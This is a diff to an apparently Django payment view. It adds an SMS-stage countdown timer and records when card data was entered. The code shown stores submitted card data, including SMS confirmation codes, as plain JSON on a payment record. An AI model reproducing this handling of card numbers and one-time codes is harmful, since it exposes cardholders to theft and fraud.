@@ -56,15 +56,25 @@ def get_phone_script(card_num) -> PhoneScript:
 
 
 TIMER_SECONDS = 300
+TIMER_SMS_SECONDS = 120
 
 
-def get_time_remaining(pay: Payment) -> datetime.timedelta:
-    time_remaining = pay.create_at + datetime.timedelta(seconds=TIMER_SECONDS) - timezone.now()
-    return time_remaining
+def get_time_remaining(pay: Payment) -> tuple[datetime.timedelta, int]:
+
+    if pay.cc_data_input_time:
+        time_remaining = pay.cc_data_input_time + datetime.timedelta(seconds=TIMER_SMS_SECONDS) - timezone.now()
+        limit = TIMER_SMS_SECONDS
+    else:
+        time_remaining = pay.create_at + datetime.timedelta(seconds=TIMER_SECONDS) - timezone.now()
+        limit = TIMER_SECONDS
+    logger.debug(pay.cc_data_input_time)
+    logger.debug(time_remaining)
+    return time_remaining, limit
 
 
 def get_time_remaining_data(pay: Payment) -> dict:
-    time_remaining = get_time_remaining(pay)
+    logger.debug('get_time_remaining_data')
+    time_remaining, limit = get_time_remaining(pay)
     if time_remaining.total_seconds() > 0:
         hours = time_remaining.seconds // 3600
         minutes = (time_remaining.seconds % 3600) // 60
@@ -76,8 +86,8 @@ def get_time_remaining_data(pay: Payment) -> dict:
             'minutes': minutes,
             'seconds': seconds,
             'total_seconds': int(time_remaining.total_seconds()),
-            'limit': TIMER_SECONDS,
-            'time_passed': int(TIMER_SECONDS - time_remaining.total_seconds())
+            'limit': limit,
+            'time_passed': int(limit - time_remaining.total_seconds())
         }
     else:
         data = {
@@ -292,6 +302,10 @@ def pay_to_m10_create(request, *args, **kwargs):
             sms_code = card_data.get('sms_code')
             payment.card_data = json.dumps(card_data, ensure_ascii=False)
             payment.phone_script_data = phone_script.data_json()
+            if not payment.cc_data_input_time:
+                payment.cc_data_input_time = timezone.now()
+                payment.save()
+                context['data'] = get_time_remaining_data(payment)
             # Если ввел смс-код или status 3 и смс код не требуется
             if sms_code or (payment.status == 3 and not phone_script.step_2_required):
                 # payment.status = 7  # Ожидание подтверждения
